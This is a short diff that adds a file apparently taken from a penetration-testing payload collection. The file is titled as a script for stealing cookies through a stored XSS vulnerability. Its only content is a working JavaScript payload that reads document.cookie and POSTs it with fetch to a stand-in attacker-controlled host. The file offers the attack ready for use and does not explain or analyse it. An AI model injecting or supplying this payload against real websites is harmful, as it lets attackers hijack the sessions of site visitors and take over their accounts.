@@ -1,0 +1,10 @@
+Script for stealing cookies via Stored XSS vulnerability
+--------------------------------------------------------
+<script>
+fetch('https://WEB-CONTROLLED-BY-TESTER', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+--------------------------------------------------------
